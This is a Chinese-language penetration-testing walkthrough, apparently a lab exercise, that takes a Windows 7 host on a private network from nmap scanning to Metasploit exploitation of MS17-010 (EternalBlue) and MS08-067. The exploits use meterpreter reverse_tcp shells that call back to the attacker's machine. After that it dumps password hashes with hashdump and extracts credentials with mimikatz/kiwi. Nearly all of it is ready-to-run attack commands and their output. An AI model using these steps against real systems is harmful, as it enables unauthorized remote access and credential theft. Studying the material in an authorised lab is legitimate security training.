### 1、扫描目标机情况

```
root@kali:~# nmap -sV -Pn -O 192.168.79.133          //大写的O，发现445端口处于开放状态
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 
```

### 2、漏洞验证ms17-010

```
扫描端口是否存在ms17-010漏洞
方法一、
root@kali:~# nmap --script smb-vuln-ms17-010 192.168.79.133
root@kali:~# nmap --script smb-vuln-*.nse 192.168.79.133  //可使用这个命令，检查所有smb漏洞
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE                                  //状态为易受感染的
|     IDs:  CVE:CVE-2017-0143                            //发现CVE:CVE-2017-0143可用
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

方法二、
root@kali:~# msfconsole
msf5 > search ms17-010
msf5 > use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhost 192.168.79.133
msf5 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 192.168.79.133:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)                                   //易受感染的
[*] 192.168.79.133:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

漏洞验证ms17-010
root@kali:~# msfconsole
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.79.133
rhosts => 192.168.79.133
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp                 //此处加载payload使用x64版本
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.79.138     //本机ip
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
meterpreter > 
```

### 3、漏洞验证ms08_067

```
nmap检查漏洞是否存在
root@kali:~# nmap --script smb-vuln-ms08-067.nse 192.168.91.151

漏洞验证ms08_06
msf > use exploit/windows/smb/ms08_067_netapi 
msf exploit(ms08_067_netapi) > set rhost 192.168.201.135
msf exploit(ms08_067_netapi) > check        //检测是否存在漏洞
[+] 192.168.201.135:445 The target is vulnerable.   
msf exploit(ms08_067_netapi) > set lhost 192.168.201.133
msf exploit(ms08_067_netapi) > set target 34
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp_allports 
payload => windows/meterpreter/reverse_tcp_allports
msf exploit(ms08_067_netapi) > exploit 
```

### 4、获取密码

1）查看目标机器相关信息

```
meterpreter > sysinfo         
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

2）获取目标及hash值

```
meterpreter > hashdump
Administrator:500:aad3此处马赛克404ee:31d6cfe0d16ae此处马赛克c089c0:::
Guest:501:aad3此处马赛克4ee:31d6cfe0d1此处马赛克7e0c089c0:::
```

3、加载mimikatz

```
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > load kiwi                             //版本太老，需使用load kiwi替代
```

4、运行命令`msv`,导出hash

```
meterpreter > msv
```

5、执行`kerberos`即可获得目标机账号密码

```
meterpreter > kerberos
```



